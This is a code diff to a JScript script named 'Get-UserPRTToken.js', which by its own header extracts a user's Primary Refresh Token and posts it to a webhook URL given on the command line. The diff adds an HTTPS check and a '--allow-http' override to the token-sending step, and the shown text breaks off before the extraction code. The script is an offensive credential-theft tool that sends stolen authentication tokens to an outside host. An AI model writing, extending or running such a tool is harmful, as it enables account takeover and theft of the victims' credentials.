@@ -1,10 +1,28 @@
 // JScript implementation of PRT token extraction
-// Usage: cscript //Nologo Get-UserPRTToken.js <webhook_url>
+// Usage: cscript //Nologo Get-UserPRTToken.js <webhook_url> [--allow-http]
 
 var webhookUrl = WScript.Arguments.length > 0 ? WScript.Arguments(0) : "";
 if (!webhookUrl) {
-    WScript.Echo("[!] Usage: cscript //Nologo Get-UserPRTToken.js <webhook_url>");
+    WScript.Echo("[!] Usage: cscript //Nologo Get-UserPRTToken.js <webhook_url> [--allow-http]");
     WScript.Quit(1);
+}
+
+// Check for --allow-http flag
+var allowHttp = false;
+if (WScript.Arguments.length > 1 && WScript.Arguments(1).toLowerCase() === "--allow-http") {
+    allowHttp = true;
+}
+
+// Validate HTTPS for secure transmission of PRT token (unless --allow-http)
+if (webhookUrl.toLowerCase().indexOf("https://") !== 0) {
+    if (allowHttp) {
+        WScript.Echo("[!] WARNING: Using HTTP - token will be sent unencrypted!");
+    } else {
+        WScript.Echo("[!] ERROR: Webhook URL must use HTTPS for secure token transmission");
+        WScript.Echo("[!] Provided URL: " + webhookUrl);
+        WScript.Echo("[!] Use --allow-http flag to bypass (insecure, for local testing only)");
+        WScript.Quit(1);
+    }
 }
 
 try {
